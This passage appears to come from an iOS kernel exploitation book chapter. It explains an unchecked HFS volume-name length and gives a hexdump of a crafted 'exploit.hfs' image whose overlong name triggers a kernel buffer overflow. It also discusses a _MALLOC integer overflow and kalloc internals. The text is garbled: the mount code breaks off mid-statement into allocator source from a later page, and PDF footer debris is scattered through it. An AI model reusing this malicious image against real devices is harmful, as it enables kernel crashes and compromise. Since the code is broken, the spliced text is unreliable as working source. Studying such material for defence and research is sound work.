u_int16_t drSigWord; /* == kHFSSigWord */
u_int32_t drCrDate; /* date and time of volume creation */
u_int32_t drLsMod; /* date and time of last modifi cation */
u_int16_t drAtrb; /* volume attributes */
u_int16_t drNmFls; /* number of fi les in root folder */
u_int16_t drVBMSt; /* fi rst block of volume bitmap */
u_int16_t drAllocPtr; /* start of next allocation search */
u_int16_t drNmAlBlks; /* number of allocation blocks in volume */
u_int32_t drAlBlkSiz; /* size (in bytes) of allocation blocks */
u_int32_t drClpSiz; /* default clump size */
u_int16_t drAlBlSt; /* fi rst allocation block in volume */
u_int32_t drNxtCNID; /* next unused catalog node ID */
u_int16_t drFreeBks; /* number of unused allocation blocks */
u_int8_t drVN[kHFSMaxVolumeNameChars + 1]; /* volume name */
u_int32_t drVolBkUp; /* date and time of last backup */
u_int16_t drVSeqNum; /* volume backup sequence number */
...
You can see that in the original definition a maximum number of
kHFSMaxVolumeNameChars characters are allowed for the volume name. The source
code defi nes this constant as 27. The code does not limit this fi eld in any way,
and therefore overlong volume names just get passed through to the Unicode
conversion function. With this information you can now create a malicious HFS
image that triggers the overfl ow:
$ hexdump -C exploit.hfs
00000000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................|
*
00000400 42 44 00 00 00 00 00 00 00 00 01 00 00 00 00 00 |BD..............|
00000410 00 00 00 00 00 00 02 00 00 00 00 00 00 00 00 00 |................|
00000420 00 00 00 00 60 41 41 41 41 42 42 42 42 43 43 43 |....`AAAABBBBCCC|
00000430 43 44 44 44 44 45 45 45 45 46 46 46 46 47 47 47 |CDDDDEEEEFFFFGGG|
cc0099..iinndddd 228811 44//1166//22001122 55::4477::0099 PPMM
282 Chapter 9 n Kernel Debugging and Exploitation
00000440 47 48 48 48 48 49 49 49 49 4a 4a 4a 4a 4b 4b 4b |GHHHHIIIIJJJJKKK|
00000450 4b 4c 4c 4c 4c 4d 4d 4d 4d 4e 4e 4e 4e 4f 4f 4f |KLLLLMMMMNNNNOOO|
00000460 4f 50 50 50 50 51 51 51 51 52 52 52 52 53 53 53 |OPPPPQQQQRRRRSSS|
00000470 53 54 54 54 54 55 55 55 55 56 56 56 56 57 57 57 |STTTTUUUUVVVVWWW|
00000480 57 58 58 58 58 00 00 00 00 00 00 00 00 00 00 00 |WXXXX...........|
00000490 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................|
*
00000600
This HFS image contains an overlong volume name of 96 bytes, which should
overfl ow the buffer in this case. Because the name consists of real letters from
the alphabet, the Unicode conversion should transform all of them into illegal
memory addresses, which heightens the probability of a crash. To mount the
HFS image, you have to use the /dev/vn0 device:
int ret, fd; struct vn_ioctl vn; struct hfs_mount_args args;
fd = open(“/dev/vn0”, O_RDONLY, 0);
if (fd = M_LAST)
panic(“_malloc TYPE”);
if (size == 0)
return (NULL);
if (flags & M_NOWAIT) {
hdr = (void *)kalloc_noblock(memsize);
} else {
hdr = (void *)kalloc(memsize);
if (hdr == NULL) {
panic(“_MALLOC: kalloc returned NULL (potential leak),
size %llu”,
(uint64_t) size);
}
}
if (!hdr)
return (0);
hdr->mlen = memsize;
if (flags & M_ZERO)
bzero(hdr->dat, size);
return (hdr->dat);
}
cc0099..iinndddd 228877 44//1166//22001122 55::4477::1100 PPMM
288 Chapter 9 n Kernel Debugging and Exploitation
The most interesting part of this function is the possible integer overfl ow
in the allocation that is triggered when 0xFFFFFFFC or more bytes are allo-
cated. This could be triggered in several different places in the past; however,
Apple silently fi xed this vulnerability in iOS 5.0. Now _MALLOC() detects
the possible integer overfl ow and returns NULL or panics, depending on
the M_NOWAIT fl ag.
Nevertheless, _MALLOC() is just a wrapper around kalloc(), which is a bit
more complicated, because it wraps two different kernel heap allocators. It is
defi ned within the fi le /osfmk/kern/kern_alloc.c. We show only the relevant
parts that involve the zone allocator, because the kmem_alloc() allocator has
not been analyzed, yet:
void *
kalloc_canblock(
vm_size_t size,
boolean_t canblock)
{